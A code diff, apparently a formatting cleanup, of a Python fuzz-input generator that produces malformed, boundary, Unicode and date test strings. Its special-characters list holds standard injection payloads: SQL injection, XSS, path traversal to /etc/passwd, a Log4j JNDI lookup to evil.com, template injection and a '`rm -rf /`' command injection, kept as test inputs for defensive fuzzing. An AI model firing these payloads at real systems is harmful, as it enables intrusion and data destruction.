@@ -25,8 +25,6 @@ Usage:
 """
 
 import random
-import string
-from datetime import datetime, timedelta, UTC
 from typing import Any, Dict, List, Optional, Iterator
 from dataclasses import dataclass
 from enum import Enum
@@ -84,10 +82,7 @@ class FuzzGenerator:
 
     def _should_generate_valid(self) -> bool:
         """Determine if this iteration should generate valid input."""
-        return (
-            self.config.include_valid
-            and random.random() < self.config.valid_ratio
-        )
+        return self.config.include_valid and random.random() < self.config.valid_ratio
 
     def generate_string(self, category: FuzzCategory) -> str:
         """Generate a fuzzed string based on category.
@@ -102,57 +97,69 @@ class FuzzGenerator:
             return random.choice(["", " ", "\n", "\t", "   "])
 
         elif category == FuzzCategory.MALFORMED:
-            return random.choice([
-                "{incomplete json",
-                "```not closed",
-                "<tag>no close",
-                "\\invalid\\escape",
-                "\x00null byte",
-                "\r\n\r\nheaders",
-            ])
+            return random.choice(
+                [
+                    "{incomplete json",
+                    "```not closed",
+                    "<tag>no close",
+                    "\\invalid\\escape",
+                    "\x00null byte",
+                    "\r\n\r\nheaders",
+                ]
+            )
 
         elif category == FuzzCategory.BOUNDARY:
-            return random.choice([
-                "a",  # Minimum length
-                "A" * self.config.max_string_length,  # Maximum length
-                "-1",  # Negative number
-                "0",  # Zero
-                "999999999999",  # Large number
-            ])
+            return random.choice(
+                [
+                    "a",  # Minimum length
+                    "A" * self.config.max_string_length,  # Maximum length
+                    "-1",  # Negative number
+                    "0",  # Zero
+                    "999999999999",  # Large number
+                ]
+            )
 
         elif category == FuzzCategory.UNICODE:
-            return random.choice([
-                "안녕하세요 👋 こんにちは",  # Mixed scripts
-                "🔥💯🎉" * 10,  # Emoji spam
-                "\u202e" + "reversed",  # Right-to-left override
-                "test\u0000null",  # Embedded null
-                "ﷺ" * 100,  # Complex Unicode
-                "𝕳𝖊𝖑𝖑𝖔",  # Mathematical alphanumeric symbols
-            ])
+            return random.choice(
+                [
+                    "안녕하세요 👋 こんにちは",  # Mixed scripts
+                    "🔥💯🎉" * 10,  # Emoji spam
+                    "\u202e" + "reversed",  # Right-to-left override
+                    "test\u0000null",  # Embedded null
+                    "ﷺ" * 100,  # Complex Unicode
+                    "𝕳𝖊𝖑𝖑𝖔",  # Mathematical alphanumeric symbols
+                ]
+            )
 
         elif category == FuzzCategory.OVERSIZED:
             length = random.choice([1000, 5000, 10000, 50000])
             return "X" * length
 
         elif category == FuzzCategory.SPECIAL_CHARS:
-            return random.choice([
-                "'; DROP TABLE users; --",  # SQL injection
-                "<script>alert('xss')</script>",  # XSS
-                "../../../etc/passwd",  # Path traversal
-                "${jndi:ldap://evil.com}",  # Log4j
-                "\\x00\\x01\\x02",  # Binary data
-                "{{7*7}}",  # Template injection
-                "`rm -rf /`",  # Command injection
-            ])
+            return random.choice(
+                [
+                    "'; DROP TABLE users; --",  # SQL injection
+                    "<script>alert('xss')</script>",  # XSS
+                    "../../../etc/passwd",  # Path traversal
+                    "${jndi:ldap://evil.com}",  # Log4j
+                    "\\x00\\x01\\x02",  # Binary data
+                    "{{7*7}}",  # Template injection
+                    "`rm -rf /`",  # Command injection
+                ]
+            )
 
         elif category == FuzzCategory.TYPE_MISMATCH:
-            return str(random.choice([
-                123,  # Number as string
-                True,  # Boolean as string
-                None,  # None as string
-                [],  # List as string
-                {},  # Dict as string
-            ]))
+            return str(
+                random.choice(
+                    [
+                        123,  # Number as string
+                        True,  # Boolean as string
+                        None,  # None as string
+                        [],  # List as string
+                        {},  # Dict as string
+                    ]
+                )
+            )
 
         elif category == FuzzCategory.MISSING_FIELDS:
             return ""  # Represents missing field
@@ -217,8 +224,7 @@ class FuzzGenerator:
             ]
             present_fields = random.sample(fields, k=random.randint(0, len(fields)))
             return {
-                field: {"value": "test", "confidence": 0.5}
-                for field in present_fields
+                field: {"value": "test", "confidence": 0.5} for field in present_fields
             }
 
         elif category == FuzzCategory.TYPE_MISMATCH:
@@ -272,21 +278,25 @@ class FuzzGenerator:
             category = random.choice(list(FuzzCategory))
 
         if category == FuzzCategory.MALFORMED:
-            return random.choice([
-                "2025-13-45",  # Invalid month/day
-                "2025/12/01",  # Wrong separator
-                "Dec 1st, 2025",  # English format
-                "1일 12월 2025년",  # Wrong order
-                "2025-12-",  # Incomplete
-            ])
+            return random.choice(
+                [
+                    "2025-13-45",  # Invalid month/day
+                    "2025/12/01",  # Wrong separator
+                    "Dec 1st, 2025",  # English format
+                    "1일 12월 2025년",  # Wrong order
+                    "2025-12-",  # Incomplete
+                ]
+            )
 
         elif category == FuzzCategory.BOUNDARY:
-            return random.choice([
-                "0000-01-01",  # Minimum date
-                "9999-12-31",  # Maximum date
-                "2025-02-30",  # Invalid day for month
-                "2025-00-01",  # Zero month
-            ])
+            return random.choice(
+                [
+                    "0000-01-01",  # Minimum date
+                    "9999-12-31",  # Maximum date
+                    "2025-02-30",  # Invalid day for month
+                    "2025-00-01",  # Zero month
+                ]
+            )
 
         else:
             return self.generate_string(category)
